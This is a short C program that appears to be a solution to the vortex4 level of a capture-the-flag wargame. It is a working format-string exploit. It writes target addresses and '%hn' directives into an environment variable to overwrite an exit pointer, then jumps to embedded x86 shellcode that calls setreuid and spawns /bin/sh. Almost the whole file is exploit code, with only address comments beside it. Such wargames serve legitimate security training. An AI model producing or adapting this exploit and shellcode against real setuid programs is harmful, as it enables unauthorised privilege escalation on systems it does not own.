#include <unistd.h>

//exit: 0x8049060
//shellcode: 0xffffdfc6
//shellcode: 0xffffdfae
//0xffff = 65535
//0xdfae = 57262
//57254=57262-8

int main(void) {
    char payload[80] = "\x16\xc0\x04\x08\x14\xc0\x04\x08  ""%57252d%137$hn%8273d%136$hn";
    char *environment[23] = {"AAAA", payload, "BBBB", "MORE", "MORE", "MORE", "DDDDDDDD", "EEEE", "FFFF", "GGGG", "HHHH", "IIII", "JJJJ", "KKKK", "LLLL", "MMMM", "NNNN", "OOOO", "PPPP", "QQQQ", "SHELLCODE=1\xc0\xb0\x46""1\xdb""f\xbb\x8d\x13""1\xc9""f\xb9\x8d\x13\xcd\x80\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe5\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51\x8b\x1c\x24\x89\xe1\xb0\x0b\xcd\x80", 0};
    char *empty[] = {NULL};
    execve("/vortex/vortex4", empty, environment);
}
